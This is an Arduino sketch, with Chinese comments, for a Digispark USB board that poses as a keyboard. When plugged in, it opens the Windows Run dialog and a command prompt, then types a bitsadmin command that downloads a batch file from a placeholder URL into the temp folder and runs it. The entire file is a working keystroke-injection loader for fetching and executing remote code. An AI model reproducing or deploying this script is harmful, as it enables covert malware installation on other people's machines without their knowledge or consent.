#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(1000); // 等待计算机启动

  // 发送组合键：Win+R 打开运行对话框
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cmd"); //
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("bitsadmin /transfer File /download /priority normal <Your File Url> %TEMP%\hellobaby.bat && %temp%\hellobaby.bat && exit"); // 下载文件
  DigiKeyboard.delay(100);  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // 发送回车键
  DigiKeyboard.delay(100);  
}

void loop() {


}
